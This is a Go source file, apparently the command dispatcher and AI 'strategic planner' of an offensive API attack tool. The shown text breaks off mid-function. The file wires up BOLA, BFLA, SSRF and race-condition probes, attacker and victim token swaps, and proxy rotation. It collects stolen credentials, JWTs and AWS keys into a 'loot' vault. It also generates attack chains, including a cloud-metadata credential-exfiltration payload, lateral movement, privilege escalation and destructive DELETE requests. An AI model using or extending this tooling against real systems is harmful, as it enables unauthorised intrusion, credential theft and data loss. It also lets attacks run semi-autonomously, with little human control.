package engine

import (
	"fmt"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
	"github.com/JoseMariaMicoli/VaporTrace/pkg/discovery"
	"github.com/JoseMariaMicoli/VaporTrace/pkg/logic"
	"github.com/JoseMariaMicoli/VaporTrace/pkg/report"
	"github.com/JoseMariaMicoli/VaporTrace/pkg/utils"
)

// --- STRATEGIC PLANNER STRUCTURES ---

// TacticalAction represents a single step in the HITL workflow (Extended for Full Autonomy - Sprint 11.2)
type TacticalAction struct {
	ID           int
	Type         string // BOLA, BFLA, INJECTION, BYPASS
	Target       string
	Payload      string
	Confidence   string // HIGH, MED, LOW, CRITICAL
	Reasoning    string // AI explanation
	Status       string // PENDING, EXECUTED, DROPPED
	PreCondition string // DataSilo key to check before execution (e.g., "k8s_token", "admin_session")
	ChainID      string // Links related actions for autonomous execution
	Loot         string // Captured data from execution (credentials, tokens, env vars)
}

// ActionBuffer is the global staging area for the planner
var ActionBuffer []TacticalAction

// getTarget helps commands inherit the global target if no argument is provided
func getTarget(args []string) string {
	if len(args) > 0 {
		return args[0]
	}
	global := logic.CurrentSession.GetTarget()
	if global == "" || global == "http://localhost" {
		return ""
	}
	return global
}

// ExecuteCommand parses raw input strings and routes them to the appropriate logic module.
func ExecuteCommand(rawCmd string) {
	if rawCmd == "" {
		return
	}
	parts := strings.Fields(rawCmd)
	verb := strings.ToLower(parts[0])
	args := parts[1:]

	utils.TacticalLog(fmt.Sprintf("[yellow]EXEC:[-] %s", rawCmd))

	switch verb {
	// --- NEW TASKS COMMAND (Requested Feature) ---
	case "tasks":
		utils.TacticalLog("[cyan]=== ACTIVE TACTICAL TASKS ===[-]")

		// 1. Aggregator Status
		aggStatus := "[red]STOPPED"
		if logic.GlobalAggregator.Active {
			aggStatus = fmt.Sprintf("[green]RUNNING (Interval: %v)[-]", logic.GlobalAggregator.Interval)
		}
		utils.TacticalLog(fmt.Sprintf(" [white]Context Aggregator:[-] %s", aggStatus))

		// 2. Neural Engine Status
		neuroStatus := "[red]OFFLINE"
		if logic.GlobalNeuro.Active {
			neuroStatus = "[green]ACTIVE (Hybrid Mode)[-]"
		}
		utils.TacticalLog(fmt.Sprintf(" [white]Neural Engine:     [-] %s", neuroStatus))

		// 3. Interceptor Status
		intStatus := "[yellow]STANDBY (Passive)"
		if logic.InterceptorActive {
			intStatus = "[red]BLOCKING (Active)[-]"
		}
		utils.TacticalLog(fmt.Sprintf(" [white]HTTP Interceptor:  [-] %s", intStatus))

		// 4. Proxy Rotation
		proxyCount := len(logic.ProxyPool)
		proxyStatus := "[gray]Direct (No Proxy Pool)"
		if proxyCount > 0 {
			proxyStatus = fmt.Sprintf("[blue]ROTATING (%d Nodes Active)[-]", proxyCount)
		}
		utils.TacticalLog(fmt.Sprintf(" [white]Proxy Network:     [-] %s", proxyStatus))

		utils.TacticalLog("[cyan]=============================[-]")

	// --- NEURAL ENGINE (Sprint 10.6) ---
	// Task 4: AI Interaction
	case "ask":
		if len(args) == 0 {
			utils.TacticalLog("Usage: ask <your question>")
			return
		}
		question := strings.Join(args, " ")
		utils.TacticalLog(fmt.Sprintf("[blue]USER ASK:[-] %s", question))

		go func() {
			if !logic.GlobalNeuro.Active {
				utils.TacticalLog("[yellow]NEURO:[-] Engine inactive. Auto-starting Hybrid mode...")
				logic.GlobalNeuro.Configure("hybrid", "", "", "")
			}
			utils.LogNeural(fmt.Sprintf("[gray]>>> USER QUERY: %s[-]", question))
			resp, err := logic.GlobalNeuro.ExecuteQuery(question)
			if err != nil {
				utils.TacticalLog(fmt.Sprintf("[red]NEURO ERROR:[-] %v", err))
				return
			}
			utils.LogNeural(fmt.Sprintf("\n[cyan]=== NEURO RESPONSE ===[-]\n[white]%s[-]\n", resp))
		}()

	case "neuro":
		if len(args) == 0 {
			utils.TacticalLog("Usage: neuro config | neuro on | neuro off")
			return
		}
		if args[0] == "config" {
			if len(args) < 3 {
				utils.TacticalLog("[red]Usage:[-] neuro config <provider> <model> [api_key] [endpoint]")
				return
			}
			provider := args[1]
			model := args[2]
			apiKey := ""
			endpoint := ""
			if len(args) > 3 {
				apiKey = args[3]
			}
			if len(args) > 4 {
				endpoint = args[4]
			}
			logic.GlobalNeuro.Configure(provider, apiKey, model, endpoint)
		} else if args[0] == "on" {
			logic.GlobalNeuro.Active = true
			utils.TacticalLog("[green]Neural Engine Activated.[-]")
		} else if args[0] == "off" {
			logic.GlobalNeuro.Active = false
			utils.TacticalLog("[yellow]Neural Engine Deactivated.[-]")
		}

	case "test-neuro":
		utils.TacticalLog("[blue]Testing Neural Engine Connectivity...[-]")
		logic.GlobalNeuro.TestConnectivity()

	case "neuro-gen":
		if len(args) < 2 {
			utils.TacticalLog("[yellow]Usage: neuro-gen <context_string> <count>")
			return
		}
		count, _ := strconv.Atoi(args[1])
		logic.GlobalNeuro.GenerateAttackVectors(args[0], count)

	// --- IDENTITY & SESSION ---
	case "auth":
		if len(args) < 2 {
			utils.TacticalLog("[red]Usage:[-] auth <attacker|victim> <token>")
			return
		}
		if args[0] == "attacker" {
			logic.CurrentSession.AttackerToken = args[1]
		} else {
			logic.CurrentSession.VictimToken = args[1]
		}
		utils.TacticalLog(fmt.Sprintf("[green]Identity Updated:[-] %s", args[0]))

	case "target":
		if len(args) > 0 {
			err := logic.CurrentSession.SetGlobalTarget(args[0])
			if err != nil {
				utils.TacticalLog(fmt.Sprintf("[red]Target Error:[-] %v", err))
			} else {
				utils.TacticalLog(fmt.Sprintf("[green]Target Locked:[-] %s", args[0]))
			}
		}

	case "sessions":
		utils.TacticalLog(fmt.Sprintf("Attacker Token: %s...", shortToken(logic.CurrentSession.AttackerToken)))
		utils.TacticalLog(fmt.Sprintf("Victim Token:   %s...", shortToken(logic.CurrentSession.VictimToken)))

	// --- DISCOVERY & RECON ---
	case "swagger":
		target := getTarget(args)
		if target == "" {
			utils.TacticalLog("[red]Error:[-] Usage: swagger <url> (or set global target)")
			return
		}
		utils.TacticalLog(fmt.Sprintf("[blue]Parsing OpenAPI spec at %s...[-]", target))
		go func() {
			endpoints, err := discovery.ParseSwagger(target, "")
			if err != nil {
				utils.TacticalLog(fmt.Sprintf("[red]Swagger Failed:[-] %v", err))
				return
			}
			utils.TacticalLog(fmt.Sprintf("[green]Success:[-] Found %d endpoints.", len(endpoints)))
		}()

	case "scrape":
		target := getTarget(args)
		if target == "" {
			utils.TacticalLog("[red]Error:[-] Usage: scrape <js_url> (or set global target)")
			return
		}
		utils.TacticalLog(fmt.Sprintf("[blue]Scraping JS Bundle: %s...[-]", target))
		go func() {
			paths, err := discovery.ExtractJSPaths(target, "")
			if err != nil {
				utils.TacticalLog(fmt.Sprintf("[red]Scrape Failed:[-] %v", err))
				return
			}
			utils.TacticalLog(fmt.Sprintf("[green]Success:[-] Extracted %d paths.", len(paths)))
		}()

	case "mine":
		target := getTarget(args)
		endpoint := ""
		if len(args) >= 2 {
			target = args[0]
			endpoint = args[1]
		} else if len(args) == 1 && logic.CurrentSession.GetTarget() != "" {
			target = logic.CurrentSession.GetTarget()
			endpoint = args[0]
		}

		if target == "" {
			utils.TacticalLog("[red]Error:[-] Usage: mine <url> <endpoint>")
			return
		}

		utils.TacticalLog(fmt.Sprintf("[blue]Mining hidden parameters on %s%s...[-]", target, endpoint))
		go func() {
			discovery.MineParameters(target, endpoint, "")
			utils.TacticalLog("[green]Mining Sequence Complete.[-]")
		}()

	case "map":
		target := getTarget(args)
		if target != "" {
			utils.TacticalLog(fmt.Sprintf("[blue]Starting Phase 2 Recon against %s...[-]", target))
			go func() {
				endpoints, err := discovery.ParseSwagger(target, "")
				if err != nil {
					utils.TacticalLog(fmt.Sprintf("[red]Swagger Error:[-] %v", err))
				} else {
					utils.TacticalLog(fmt.Sprintf("[green]Swagger Mapped:[-] %d routes", len(endpoints)))
				}
				discovery.MineParameters(target, "", "")
				utils.TacticalLog("[green]Recon Map Finished.[-]")
			}()
		} else {
			utils.TacticalLog("[red]Error:[-] Usage: map <url> (or set global target first).")
		}

	case "pipeline":
		utils.TacticalLog("[aqua]Initializing Industrialized Attack Pipeline...[-]")
		go func() {
			utils.TacticalLog(fmt.Sprintf("[blue]Concurrency Level: %d threads[-]", logic.CurrentSession.Threads))
			logic.RunPipeline(logic.CurrentSession.Threads)
		}()

	// --- LOGIC PROBES ---
	case "bola":
		target := getTarget(args)
		isPipeline := false
		if len(args) > 0 && (args[0] == "--pipeline" || args[0] == "-p") {
			isPipeline = true
		}
		if isPipeline {
			utils.TacticalLog("[aqua]Starting Mass BOLA Pipeline Scan...[-]")
			go logic.ExecuteMassBOLA(logic.CurrentSession.Threads)
		} else if target != "" {
			victim := "1"
			if len(args) >= 2 {
				target = args[0]
				victim = args[1]
			} else if len(args) == 1 && logic.CurrentSession.GetTarget() != "" {
				victim = args[0]
			}
			utils.TacticalLog(fmt.Sprintf("[blue]Launching Surgical BOLA Probe on %s (ID: %s)...[-]", target, victim))
			ctx := &logic.BOLAContext{BaseURL: target, VictimID: victim}
			go func() {
				ctx.ProbeSilent()
				utils.TacticalLog("[green]Surgical BOLA Probe Finished.[-]")
			}()
		} else {
			utils.TacticalLog("[red]Error:[-] No target set. Use 'target <url>' or 'bola <url> <id>'.")
		}

	case "bfla":
		if logic.CurrentSession.GetTarget() != "" {
			utils.TacticalLog("[aqua]Starting Mass BFLA Matrix (Verb Tampering)...[-]")
			go logic.ExecuteMassBFLA(logic.CurrentSession.Threads)
		} else {
			utils.TacticalLog("[red]Error:[-] No global target set. Run 'target <url>' first.")
		}

	case "bopla":
		if logic.CurrentSession.GetTarget() != "" {
			utils.TacticalLog("[aqua]Starting Mass BOPLA Fuzzer (Property Injection)...[-]")
			go logic.ExecuteMassBOPLA(logic.CurrentSession.Threads)
		} else {
			utils.TacticalLog("[red]Error:[-] No global target set. Run 'target <url>' first.")
		}

	case "exhaust":
		target := getTarget(args)
		param := "limit"
		if len(args) >= 2 {
			target = args[0]
			param = args[1]
		} else if len(args) == 1 && logic.CurrentSession.GetTarget() != "" {
			target = logic.CurrentSession.GetTarget()
			param = args[0]
		}
		if target == "" {
			utils.TacticalLog("[red]Usage:[-] exhaust <url> <param>")
		} else {
			go func() {
				utils.TacticalLog(fmt.Sprintf("[blue]Fuzzing Pagination on %s?%s=...[-]", target, param))
				ctx := &logic.ExhaustionContext{TargetURL: target, ParamName: param}
				ctx.FuzzPagination()
			}()
		}

	case "ssrf":
		target := getTarget(args)
		param := "url"
		cb := "http://127.0.0.1"
		if len(args) >= 3 {
			target = args[0]
			param = args[1]
			cb = args[2]
		} else if len(args) == 2 && logic.CurrentSession.GetTarget() != "" {
			target = logic.CurrentSession.GetTarget()
			param = args[0]
			cb = args[1]
		}
		if target == "" {
			utils.TacticalLog("[red]Usage:[-] ssrf <url> <param> <callback>")
		} else {
			go func() {
				utils.TacticalLog(fmt.Sprintf("[blue]Probing SSRF on %s (%s)...[-]", target, param))
				ctx := &logic.SSRFContext{TargetURL: target, ParamName: param, Callback: cb}
				ctx.Probe()
			}()
		}

	case "audit":
		target := getTarget(args)
		if target != "" {
			utils.TacticalLog(fmt.Sprintf("[blue]Auditing Security Headers/CORS on %s...[-]", target))
			ctx := &logic.MisconfigContext{TargetURL: target}
			go func() {
				ctx.Audit()
				utils.TacticalLog("[green]Audit Complete.[-]")
			}()
		} else {
			utils.TacticalLog("[red]Usage:[-] audit <url>")
		}

	case "probe":
		target := getTarget(args)
		iType := "generic"
		if len(args) >= 2 {
			target = args[0]
			iType = args[1]
		} else if len(args) == 1 {
			if strings.HasPrefix(args[0], "http") {
				target = args[0]
			} else if logic.CurrentSession.GetTarget() != "" {
				target = logic.CurrentSession.GetTarget()
				iType = args[0]
			}
		}
		if target == "" {
			utils.TacticalLog("[red]Usage:[-] probe <url> [type] (or set global target)")
		} else {
			utils.TacticalLog(fmt.Sprintf("[blue]Launching %s Integration Probe against %s...[-]", iType, target))
			ctx := &logic.IntegrationContext{TargetURL: target, IntegrationType: iType}
			go ctx.Probe()
		}

	// --- FLOW ENGINE ---
	case "flow":
		if len(args) == 0 {
			utils.TacticalLog("Flow Commands: list, run, clear, race.")
			return
		}
		switch args[0] {
		case "list":
			if len(logic.ActiveFlow) == 0 {
				utils.TacticalLog("Flow queue empty.")
			} else {
				for i, s := range logic.ActiveFlow {
					utils.TacticalLog(fmt.Sprintf("[%d] %s %s (%s)", i+1, s.Method, s.URL, s.Name))
				}
			}
		case "clear":
			logic.ActiveFlow = []logic.FlowStep{}
			logic.FlowContext = make(map[string]string)
			utils.TacticalLog("[yellow]Flow and Context Cleared.[-]")
		case "run":
			go logic.RunFlow()
		case "race":
			if len(args) < 3 {
				utils.TacticalLog("Usage: flow race <step_id> <threads>")
				return
			}
			id, _ := strconv.Atoi(args[1])
			threads, _ := strconv.Atoi(args[2])
			go logic.RunRace(id-1, threads)
		default:
			utils.TacticalLog("Unknown flow command.")
		}

	// --- SYSTEM & DB ---
	case "init_db":
		db.InitDB()
		utils.TacticalLog("[green]Database Persistence Initialized (Empty State).[-]")

	case "seed_db":
		utils.TacticalLog("[aqua]Injecting high-fidelity mock data for C-Level Report...[-]")
		go seedDatabase()

	case "reset_db":
		db.ResetDB()
		utils.TacticalLog("[yellow]Database Purged (Reset).[-]")

	case "report":
		report.GenerateMissionDebrief()

	case "weaver":
		interval := 60
		if len(args) > 0 {
			if i, err := strconv.Atoi(args[0]); err == nil {
				interval = i
			}
		}
		utils.TacticalLog(fmt.Sprintf("[magenta]Deploying Ghost-Weaver (Interval: %ds)...[-]", interval))
		config := logic.WeaverConfig{Interval: time.Duration(interval) * time.Second, Active: true}
		go logic.StartGhostWeaver(config)

	case "loot":
		if len(args) > 0 && args[0] == "list" {
			utils.TacticalLog("[magenta]Accessing Discovery Vault...[-]")
			if len(logic.Vault) == 0 {
				utils.TacticalLog("Vault is empty.")
			}
			for _, v := range logic.Vault {
				utils.TacticalLog(fmt.Sprintf("[yellow]%s[-] %s", v.Type, v.Value))
			}
		} else if len(args) > 0 && args[0] == "clear" {
			logic.Vault = []logic.Finding{}
			utils.TacticalLog("[green]Vault Purged.[-]")
		} else {
			utils.TacticalLog("Usage: loot list | loot clear")
		}

	case "proxy":
		if len(args) > 0 {
			if args[0] == "off" {
				logic.SetProxy("")
			} else {
				logic.SetProxy(args[0])
			}
		} else {
			utils.TacticalLog("[red]Usage:[-] proxy <url> | proxy off")
		}

	case "proxies":
		if len(args) > 0 {
			if args[0] == "load" && len(args) >= 2 {
				if err := logic.LoadProxiesFromFile(args[1]); err != nil {
					utils.TacticalLog(fmt.Sprintf("[red]Load Failed:[-] %v", err))
				} else {
					logic.InitializeRotaryClient()
					utils.TacticalLog(fmt.Sprintf("[green]Proxy Pool Loaded:[-] %d proxies active.", len(logic.ProxyPool)))
				}
			} else if args[0] == "reset" {
				logic.ProxyPool = []string{}
				logic.InitializeRotaryClient()
				utils.TacticalLog("[yellow]Proxy Pool Reset. Reverting to default transport.[-]")
			} else {
				utils.TacticalLog("[red]Usage:[-] proxies load <file> | proxies reset")
			}
		}

	case "clear":
		utils.TacticalLog("___CLEAR_SCREEN_SIGNAL___")

	case "usage":
		printUsage()

	case "help":
		if len(args) > 0 {
			printHelp(args[0])
		} else {
			utils.TacticalLog("[white]Usage: help <command> OR 'help keys' for hotkeys[-]")
		}

	case "__internal_shutdown":
		go func() {
			utils.TacticalLog("[red::b]INITIATING SEQUENTIAL SHUTDOWN...[-:-:-]")
			utils.TacticalLog("[blue]⠋[-] Terminating Network Stacks...")
			time.Sleep(500 * time.Millisecond)
			utils.TacticalLog("[green]✔[-] Network Terminated.")
			utils.TacticalLog("[blue]⠋[-] Closing Database Persistence...")
			db.CloseDB()
			time.Sleep(500 * time.Millisecond)
			utils.TacticalLog("[green]✔[-] Database Sync Complete.")
			utils.TacticalLog("[blue]⠋[-] Killing Ghost-Weaver Agents...")
			time.Sleep(500 * time.Millisecond)
			utils.TacticalLog("[green]✔[-] Agents Purged.")
			utils.TacticalLog("[red::b]SYSTEM HALTED. GOODBYE.[-:-:-]")
			time.Sleep(1200 * time.Millisecond)
			os.Exit(0)
		}()

	case "exit":
		utils.TacticalLog("[yellow]Calling internal shutdown sequence...[-]")
		ExecuteCommand("__internal_shutdown")

	default:
		if strings.HasPrefix(verb, "test-") {
			handleTestCommands(verb)
		} else {
			utils.TacticalLog(fmt.Sprintf("[red]Command not recognized:[-] %s", verb))
		}
	}
}

// --- STRATEGIC ENGINE LOGIC (SPRINT 11 CORE) ---

// === SPRINT 11.1: DYNAMIC DEPENDENCY INJECTION (DDI) ===
// DataSilo aggregates telemetry from all functional layers (F1-F4)
// F1: Dashboard Status (UI/Interceptor state)
// F2: pkg/discovery - Target topology and endpoint map
// F3: pkg/db - Credentials, loot, and compromised assets
// F4: pkg/logic/network & pkg/ai - Real-time traffic telemetry and SSRF results
type DataSilo struct {
	F1_DashboardStatus DashboardStatus
	F2_Discovery       DiscoveryData
	F3_Loot            LootData
	F4_Traffic         TrafficData
}

// DashboardStatus represents F1 telemetry
type DashboardStatus struct {
	InterceptorActive  bool
	GlobalTarget       string
	AttackerToken      string
	VictimToken        string
	ProxyActive        string
	ProxyPoolSize      int
	NeuroEngineActive  bool
	ContextAggregating bool
}

// DiscoveryData represents F2 telemetry
type DiscoveryData struct {
	Endpoints     []string
	EndpointCount int
}

// LootData represents F3 telemetry
type LootData struct {
	Credentials   []string
	JWTTokens     []string
	APIKeys       []string
	AWSKeys       []string
	TotalFindings int
}

// TrafficData represents F4 telemetry
type TrafficData struct {
	RequestsProcessed int
	StatusCodeMap     map[string]int
	SSRFLeaks         []string
	LastStatus        int
}

// AggregateDataSilo pulls real-time telemetry from ALL layers
// This is the core of Sprint 11.1 Autonomous Systems
func AggregateDataSilo() *DataSilo {
	endpoints := logic.GlobalDiscovery.GetEndpoints()
	silo := &DataSilo{
		F1_DashboardStatus: DashboardStatus{
			InterceptorActive:  logic.InterceptorActive,
			GlobalTarget:       logic.CurrentSession.GetTarget(),
			AttackerToken:      logic.CurrentSession.AttackerToken,
			VictimToken:        logic.CurrentSession.VictimToken,
			ProxyActive:        logic.GetConfiguredProxy(),
			ProxyPoolSize:      len(logic.ProxyPool),
			NeuroEngineActive:  logic.GlobalNeuro.Active,
			ContextAggregating: logic.GlobalAggregator.Active,
		},
		F2_Discovery: DiscoveryData{
			Endpoints:     endpoints,
			EndpointCount: len(endpoints),
		},
		F3_Loot: LootData{
			Credentials:   extractCredentials(),
			JWTTokens:     extractJWTTokens(),
			APIKeys:       extractAPIKeys(),
			AWSKeys:       extractAWSKeys(),
			TotalFindings: len(logic.Vault),
		},
		F4_Traffic: TrafficData{
			RequestsProcessed: 0, // Will be incremented by traffic logger
			StatusCodeMap:     logic.GetTrafficHistory(),
			SSRFLeaks:         []string{}, // Will be populated by SSRF detector
			LastStatus:        0,
		},
	}
	return silo
}

// === SPRINT 11.2: HEURISTIC STATE MACHINE ===
// ProcessHeuristicStateMachine evaluates cross-silo dependencies
// If F4 detects an SSRF leak of an internal IP, cross-reference with F2/F3
// to suggest autonomous lateral movement actions
func ProcessHeuristicStateMachine(silo *DataSilo) []TacticalAction {
	var actions []TacticalAction
	id := 1

	// STATE 1: SSRF DETECTED -> Suggest lateral movement
	for _, leak := range silo.F4_Traffic.SSRFLeaks {
		if strings.Contains(leak, "10.") || strings.Contains(leak, "172.16.") || strings.Contains(leak, "192.168.") {
			// Internal IP leaked! Try to map to known endpoints
			for _, endpoint := range silo.F2_Discovery.Endpoints {
				actions = append(actions, TacticalAction{
					ID:         id,
					Type:       "LATERAL_MOVEMENT",
					Target:     silo.F1_DashboardStatus.GlobalTarget + endpoint,
					Payload:    leak, // The leaked internal IP
					Confidence: "HIGH",
					Reasoning:  fmt.Sprintf("SSRF leaked internal IP %s. Attempting lateral movement via %s", leak, endpoint),
					Status:     "PENDING",
				})
				id++
				if id > 5 {
					break
				}
			}
		}
	}

	// STATE 2: AWS KEYS + SSRF = Cloud Pivot
	if len(silo.F3_Loot.AWSKeys) > 0 && len(silo.F4_Traffic.SSRFLeaks) > 0 {
		actions = append(actions, TacticalAction{
			ID:         id,
			Type:       "CLOUD_PIVOT",
			Target:     "169.254.169.254", // AWS Metadata endpoint
			Payload:    "GET /latest/meta-data/iam/security-credentials/",
			Confidence: "CRITICAL",
			Reasoning:  "AWS keys compromised + SSRF detected = High-probability metadata exfiltration",
			Status:     "PENDING",
		})
		id++
	}

	// STATE 3: JWT Present + Protected Endpoints = Privilege Escalation Test
	if len(silo.F3_Loot.JWTTokens) > 0 {
		for _, endpoint := range silo.F2_Discovery.Endpoints {
			if strings.Contains(strings.ToLower(endpoint), "admin") {
				actions = append(actions, TacticalAction{
					ID:         id,
					Type:       "TOKEN_SWAP",
					Target:     silo.F1_DashboardStatus.GlobalTarget + endpoint,
					Payload:    "Authorization: Bearer <attacker_jwt>",
					Confidence: "HIGH",
					Reasoning:  "JWT available + admin endpoint detected. Attempting privilege escalation.",
					Status:     "PENDING",
				})
				id++
				if id > 10 {
					break
				}
			}
		}
	}

	return actions
}

// --- HELPER EXTRACTORS ---

func extractCredentials() []string {
	var creds []string
	for _, finding := range logic.Vault {
		if strings.Contains(finding.Type, "CRED") || strings.Contains(finding.Type, "PASSWORD") {
			creds = append(creds, finding.Value)
		}
	}
	return creds
}

func extractJWTTokens() []string {
	var tokens []string
	if logic.CurrentSession.AttackerToken != "" && strings.Contains(logic.CurrentSession.AttackerToken, ".") {
		tokens = append(tokens, logic.CurrentSession.AttackerToken)
	}
	if logic.CurrentSession.VictimToken != "" && strings.Contains(logic.CurrentSession.VictimToken, ".") {
		tokens = append(tokens, logic.CurrentSession.VictimToken)
	}
	return tokens
}

func extractAPIKeys() []string {
	var keys []string
	for _, finding := range logic.Vault {
		if strings.Contains(finding.Type, "API_KEY") || strings.Contains(finding.Type, "KEY") {
			keys = append(keys, finding.Value)
		}
	}
	return keys
}

func extractAWSKeys() []string {
	var keys []string
	for _, finding := range logic.Vault {
		if strings.Contains(finding.Type, "AWS") || strings.Contains(finding.Type, "AKID") {
			keys = append(keys, finding.Value)
		}
	}
	return keys
}

// GenerateStrategicPlan simulates the AI Planner by aggregating F2, F3, and F4 data
func GenerateStrategicPlan() {
	ActionBuffer = []TacticalAction{} // Reset buffer

	// 1. INGESTION: Get Discovery Map (F2)
	endpoints := logic.GlobalDiscovery.GetEndpoints()
	if len(endpoints) == 0 {
		utils.TacticalLog("[yellow]Telemetry Empty: Run 'map' or 'swagger' to populate discovery map.[-]")
		return
	}

	// 2. INGESTION: Get Loot Summary (F3)
	loot := logic.GetLootSummary()

	// 3. INGESTION: Get Traffic History (F4)
	traffic := logic.GetTrafficHistory()

	utils.TacticalLog(fmt.Sprintf("[blue]STRATEGY:[-] Scanning %d endpoints. Auth=%v, AWS=%v...", len(endpoints), loot.HasJWT, loot.HasAWS))

	id := 1

	// 4. HEURISTIC STATE MACHINE
	for _, ep := range endpoints {
		if id > 10 {
			break
		}
		fullTarget := logic.CurrentSession.GetTarget() + ep
		lastStatus, hasHistory := traffic[ep]

		// HEURISTIC A: BOLA (Broken Object Level Auth)
		// Logic: Endpoint has {id} param + We have a Token (to try swapping)
		if strings.Contains(ep, "{id}") || strings.Contains(ep, "/user/") || strings.Contains(ep, "/order/") {
			conf := "MEDIUM"
			reason := "Endpoint accepts numeric/UUID IDs. Potential IDOR."
			if loot.HasJWT {
				conf = "HIGH"
				reason += " Auth Token available for privilege context swap."
			}

			ActionBuffer = append(ActionBuffer, TacticalAction{
				ID:         id,
				Type:       "BOLA",
				Target:     fullTarget,
				Payload:    "ID: 1337", // Default placeholder
				Confidence: conf,
				Reasoning:  reason,
				Status:     "PENDING",
			})
			id++
			continue
		}

		// HEURISTIC B: BFLA / Admin Bypass
		// Logic: Endpoint is /admin + (No Auth OR 403 Forbidden History)
		isProtected := strings.Contains(strings.ToLower(ep), "admin") || strings.Contains(strings.ToLower(ep), "config")
		if isProtected {
			conf := "HIGH"
			reason := "High-value administrative target detected."

			if hasHistory && lastStatus == 403 {
				conf = "CRITICAL"
				reason += " Confirmed 403 Forbidden. Target is active and protected."
			}

			ActionBuffer = append(ActionBuffer, TacticalAction{
				ID:         id,
				Type:       "BFLA",
				Target:     fullTarget,
				Payload:    "Method: DELETE", // Try destructive method
				Confidence: conf,
				Reasoning:  reason,
				Status:     "PENDING",
			})
			id++
			continue
		}

		// HEURISTIC C: SSRF / Cloud Pivot
		// Logic: Endpoint has 'url' param + AWS Keys found in Loot
		if strings.Contains(strings.ToLower(ep), "url") || strings.Contains(strings.ToLower(ep), "webhook") {
			conf := "MEDIUM"
			reason := "Callback parameter detected."
			if loot.HasAWS {
				conf = "CRITICAL" // If we already have keys, SSRF allows deeper pivot
				reason += " AWS Keys already compromised; verify Metadata access."
			}

			ActionBuffer = append(ActionBuffer, TacticalAction{
				ID:         id,
				Type:       "SSRF",
				Target:     fullTarget,
				Payload:    "169.254.169.254",
				Confidence: conf,
				Reasoning:  reason,
				Status:     "PENDING",
			})
			id++
			continue
		}
	}

	if len(ActionBuffer) == 0 {
		utils.TacticalLog("[yellow]STRATEGY:[-] No high-probability vectors identified in current map.[-]")
	} else {
		utils.TacticalLog(fmt.Sprintf("[green]STRATEGY:[-] Plan Generated. %d Actions Buffered. Review in Tab F5.[-]", len(ActionBuffer)))
	}
}

// ComprehensiveAnalysis performs a multi-pass analysis combining heuristics, AI, and telemetry
// This function aggregates data from pkg/logic/store, pkg/logic/network, and discovery
// and feeds it to the neuro_engine for tactical decision-making. This is the core
// intelligence gathering function for the strategic planner.
// === SPRINT 11: Enhanced with DDI (Dynamic Dependency Injection) ===
func ComprehensiveAnalysis() []TacticalAction {
	var actions []TacticalAction

	// === DDI: PULL ALL TELEMETRY SILOS ===
	silo := AggregateDataSilo()
	utils.TacticalLog("[magenta]ANALYSIS:[-] Dynamic Dependency Injection: Aggregating all telemetry silos (F1-F4)...")

	// Phase 1: Ingest Discovery Data (F2)
	endpoints := silo.F2_Discovery.Endpoints
	if len(endpoints) == 0 {
		utils.TacticalLog("[yellow]ANALYSIS:[-] No endpoints discovered. Run 'map', 'swagger', or 'scrape' first.[-]")
		return actions
	}

	utils.TacticalLog(fmt.Sprintf("[blue]ANALYSIS:[-] Phase 1 Complete: %d endpoints discovered.[-]", len(endpoints)))

	// Phase 2: Ingest Loot Summary (F3)
	utils.TacticalLog(fmt.Sprintf("[blue]ANALYSIS:[-] Phase 2 Complete: JWT=%d, AWS=%d, Credentials=%d", len(silo.F3_Loot.JWTTokens), len(silo.F3_Loot.AWSKeys), len(silo.F3_Loot.Credentials)))

	// Phase 3: Ingest Traffic History (F4)
	utils.TacticalLog(fmt.Sprintf("[blue]ANALYSIS:[-] Phase 3 Complete: %d HTTP responses cached.[-]", len(silo.F4_Traffic.StatusCodeMap)))

	// === PHASE 4: HEURISTIC STATE MACHINE (with DDI awareness) ===
	heuristicActions := RunAllHeuristics(endpoints, silo.F4_Traffic.StatusCodeMap, logic.GetLootSummary())
	utils.TacticalLog(fmt.Sprintf("[cyan]ANALYSIS:[-] Heuristic Pass: %d actions generated.[-]", len(heuristicActions)))
	actions = append(actions, heuristicActions...)

	// === PHASE 5: CROSS-SILO STATE MACHINE ===
	utils.TacticalLog("[magenta]ANALYSIS:[-] Cross-Silo Evaluation: Detecting advanced attack chains...[-]")
	stateActions := ProcessHeuristicStateMachine(silo)
	utils.TacticalLog(fmt.Sprintf("[magenta]ANALYSIS:[-] Advanced Chains: %d actions generated.[-]", len(stateActions)))
	actions = append(actions, stateActions...)

	// === PHASE 6: NEURAL PASS (if enabled) ===
	if logic.GlobalNeuro.Active {
		utils.TacticalLog("[magenta]ANALYSIS:[-] Neural Pass: Engaging AI for contextual analysis...[-]")
		aiActions := GlobalNeuroCore.ComprehensiveAnalysis(endpoints, logic.GetLootSummary(), silo.F4_Traffic.StatusCodeMap)
		utils.TacticalLog(fmt.Sprintf("[magenta]ANALYSIS:[-] Neural Pass: %d AI-generated actions.[-]", len(aiActions)))

		// Merge AI actions, avoiding duplicates
		for _, aiAction := range aiActions {
			isDuplicate := false
			for _, existing := range actions {
				if existing.Type == aiAction.Type && existing.Target == aiAction.Target {
					isDuplicate = true
					break
				}
			}
			if !isDuplicate && len(actions) < 20 {
				actions = append(actions, aiAction)
			}
		}
	}

	// Phase 7: Score and Sort by Confidence
	confidenceMap := map[string]int{"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1}
	for i := range actions {
		actions[i].ID = i + 1
	}

	// Sort descending by confidence
	for i := 0; i < len(actions)-1; i++ {
		for j := i + 1; j < len(actions); j++ {
			if confidenceMap[actions[j].Confidence] > confidenceMap[actions[i].Confidence] {
				actions[i], actions[j] = actions[j], actions[i]
			}
		}
	}

	utils.TacticalLog(fmt.Sprintf("[green]ANALYSIS:[-] Complete. Total Actions: %d (Sorted by Confidence). F1=%v, F2=%d, F3=%d, F4=%d",
		len(actions), silo.F1_DashboardStatus.NeuroEngineActive, len(silo.F2_Discovery.Endpoints), silo.F3_Loot.TotalFindings, len(silo.F4_Traffic.StatusCodeMap)))

	return actions
}

// ExecuteStrategicPlan runs the approved actions from the buffer
// === SPRINT 11.4: ENHANCED WITH REAL-TIME STATUS UPDATES ===
func ExecuteStrategicPlan() {
	count := 0
	for i, act := range ActionBuffer {
		if act.Status != "PENDING" {
			continue
		}

		utils.TacticalLog(fmt.Sprintf("[magenta]EXEC STRATEGY #%d:[-] %s on %s", act.ID, act.Type, act.Target))
		utils.LogContext(fmt.Sprintf("[blue]>>> FIRING:[-] %s with payload: %s", act.Type, act.Payload))

		ActionBuffer[i].Status = "EXECUTED"
		count++

